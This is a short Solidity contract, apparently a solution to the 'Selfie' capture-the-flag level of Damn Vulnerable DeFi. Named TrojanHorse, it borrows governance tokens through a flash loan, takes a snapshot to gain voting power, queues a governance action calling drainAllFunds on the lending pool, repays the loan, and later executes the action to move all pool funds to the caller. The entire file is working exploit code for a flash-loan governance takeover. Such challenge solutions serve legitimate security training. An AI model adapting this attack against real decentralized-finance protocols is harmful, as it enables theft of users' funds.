// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SelfiePool.sol";
import "forge-std/console.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract TrojanHorse {

    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot token;
    uint256 actionId;

    constructor(address _selfiePool, address _simpleGovernance, address _token){

        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(_token);

    }

    function infiltrate(uint256 amount) public {

        selfiePool.flashLoan(amount);
        
    }
    
    function receiveTokens(address _token, uint256 amount) public {

        token.snapshot();
        
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);

        token.transfer(msg.sender, amount);

    }

    function attack() public {

        simpleGovernance.executeAction(actionId);

        token.transfer(msg.sender, token.balanceOf(address(this)));

    }

}